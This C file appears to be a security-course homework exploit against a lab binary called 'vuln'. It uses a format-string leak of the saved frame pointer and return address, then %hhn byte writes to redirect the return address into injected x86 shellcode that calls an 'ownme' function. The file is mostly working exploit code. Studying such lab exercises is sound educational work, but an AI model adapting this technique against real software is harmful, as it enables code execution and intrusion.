#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Extract the least significant byte from an integer */
int extract_lsb(unsigned val) {
   return val & 0xff;
}

/* Round a number to the nearest multiple of 256 >= to it */
int round_256(unsigned num) {
   return 256 * ((num + 255) / 256);
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Values needed for attack
   void *mainloop_ra = (void*) 0x804b652;    // main_loop saved eip
   void *main_bp     = (void*) 0xbffff018;   // main_loop saved ebp
   void *ownme_addr  = (void*) 0x804b1dd;    // addr of ownme
   void *main_ra_loc = (void*) 0xbfffefec;   // main_loop ra location
   void *rdbuf_loc   = (void*) 0xbfffe860;   // address of rdbuf

   // Relative distances
   unsigned mainloop_bp_ra_diff = main_bp - main_ra_loc;
   unsigned mainloop_ownme_diff = mainloop_ra - ownme_addr;
   unsigned mainloop_bp_rdbuff_diff = main_bp - rdbuf_loc;

   // 634 the saved bp; 635 the return address.
   put_str("e %634$x %635$x\n");
   send();

   // Get current mainloop bp and ra
   unsigned cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x", &cur_mainloop_bp, &cur_mainloop_ra);

   fprintf(stderr, "mainloop ra: %x, mainloop bp: %x\n", cur_mainloop_ra, cur_mainloop_bp);

   // Calculate current address of ra, ownme, rdbuf, and code section of exploit buffer
   unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
   unsigned cur_ownme_addr = cur_mainloop_ra - mainloop_ownme_diff;
   unsigned cur_rdbuf_addr = cur_mainloop_bp - mainloop_bp_rdbuff_diff;
   unsigned code_addr = cur_rdbuf_addr + 256;

   fprintf(stderr, "current ra location: %x\n", cur_mainloop_ra_loc);
   fprintf(stderr, "current ownme addr: %x\n", cur_ownme_addr);
   fprintf(stderr, "current rdbuff addr: %x\n", cur_rdbuf_addr);
   fprintf(stderr, "code addr: %x\n", code_addr);

   // Initialize exploit buffer (128 bytes for each of attack_format, params, injected code)
   unsigned explsz = 128 * 3;
   void** exploit = (void**)malloc(explsz);
   memset((void*)exploit, '\0', explsz);

   // NOTE: Offset, in words, from printf's stack frame to first byte in rdbuf is 152
   // (determined using GDB + trial and error). This means that 152 + 128/4 = 184 is the
   // offset to the "params" part of the exploit string
   char attack_format[] =
      "e "                          // start echo command
      "%%184$%dd%%185$%dd%%186$hhn" // write first byte to addr at offset 186
      "%%187$%dd%%188$%dd%%189$hhn" // write second byte to addr at offset 189
      "%%190$%dd%%191$%dd%%192$hhn" // write third byte to addr at offset 192
      "%%193$%dd%%194$%dd%%195$hhn" // write last byte to addr at offset 195
      "\n"                          // end echo command
   ;

   // Compute Ci/Bi as defined in the homework solution
   unsigned printed = 0, c1 = 256;
   unsigned b1 = extract_lsb(code_addr);
   printed += c1 + b1;
   
   unsigned c2 = round_256(printed) - printed;
   unsigned b2 = extract_lsb(code_addr >> 8);
   printed += c2 + b2;

   unsigned c3 = round_256(printed) - printed;
   unsigned b3 = extract_lsb(code_addr >> 16);
   printed += c3 + b3;

   unsigned c4 = round_256(printed) - printed;
   unsigned b4 = extract_lsb(code_addr >> 24);

   // Populate "attack_format" part of exploit buffer
   sprintf((char*)exploit, attack_format, c1, b1, c2, b2, c3, b3, c4, b4);

   // Populate "params" part of exploit string (128 bytes exploit = 184 words from printf's frame)
   exploit[138/sizeof(void*)] = (void*) cur_mainloop_ra_loc;
   exploit[150/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 1;
   exploit[162/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 2;
   exploit[174/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 3;

   // put_bin((void*)exploit, explsz);
   // send();

   // TODO: INJECT CODE TO CALL OWNME AT OFFSET 256 IN EXPLOIT BUFFER
   // MAIN_LOOP'S RA IS ALREADY BEING SET TO POINT TO THIS LOCATION

   char injected_code[] =
      "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
      "\xFF\xD0"              /* call *%eax */
      "\x31\xC0"              /* xor %eax, %eax (sets return value) */
      "\x68\x00\x00\x00\x00"  /* push $<cur_main_ra> */
      "\xC3"                  /* ret */
   ;

   memcpy((char*)injected_code + 1, &cur_ownme_addr, sizeof(unsigned));
   memcpy((char*)exploit + 256, &injected_code, sizeof(injected_code));

   put_bin((void*)exploit, explsz);
   send();

   // Quit so main returns to our injected code
   put_str("q\n");
   send();

   usleep(100000);

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }
}
